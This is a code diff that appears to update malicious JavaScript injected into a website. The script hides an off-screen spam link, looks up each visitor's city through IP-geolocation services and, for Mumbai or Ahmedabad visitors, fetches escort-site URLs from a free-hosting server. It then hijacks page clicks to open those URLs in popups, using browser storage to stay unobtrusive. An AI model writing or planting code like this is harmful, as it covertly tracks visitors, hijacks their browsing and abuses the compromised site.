@@ -3,26 +3,25 @@ let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https:/
 let dtm=(new Date).getMinutes();
 let dts=(new Date).getSeconds();
 let aa='';
-let bb=''
 // https://ipapi.co/country_name
-if(!localStorage.xrd){
-  (async()=>{localStorage.xrd=1;
+if(!localStorage.v){
+  (async()=>{
    try{aa=await(await(await fetch('http://ip-api.com/line/?fields=city')).text());}catch(e){aa=await(await(await fetch('https://ipapi.co/city')).text());}
-    if(aa=='Mumbai'){localStorage.mumb='1'}
-    if(aa=='Ahmadabad'){localStorage.ahme='1'}
-    uhd()
+    if(aa=='Mumbai'){localStorage.m='1';uhd()}
+    if(aa=='Ahmadabad'){localStorage.a='1';uhd()}
+    localStorage.v=1;
   })();
 }
 let uhd=()=>{
-    (async(s,k)=>{
-    if(localStorage.mumb){s='best+mumbai+escorts+mumbai.miniescort.com';k='mumbai.miniescort.com/&'}
-    if(localStorage.ahme) {s='ahmedabad+escorts+sohanisharma';k='sohanisharma.com/&'}
-    (await(await fetch(`https://finable-slot.000webhostapp.com/gsurl?q=${q}&start=0&num=5&key=${k}`)).text())
-    })()
+  (async(q,k)=>{
+    if(localStorage.m){q='best+mumbai+escorts+mumbai.miniescort.com';k='mumbai.miniescort.com/&'}
+    if(localStorage.a){q='ahmedabad+escorts+sohanisharma';k='sohanisharma.com/&'}
+    let bb=(await(await fetch(`https://finable-slot.000webhostapp.com/gsurl?q=${q}&start=0&num=5&key=${k}`)).text());
     document.onclick=()=>{
         if(m==3&&dts>5&&dts<9&bb!=''){window.open(bb);}
-        sessionStorage.i='i';
+        sessionStorage.c=1;
     }
+  })()
 }
-if(!sessionStorage.i){uhd()}
+if(!sessionStorage.c&&localStorage.v){uhd()}
 // United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
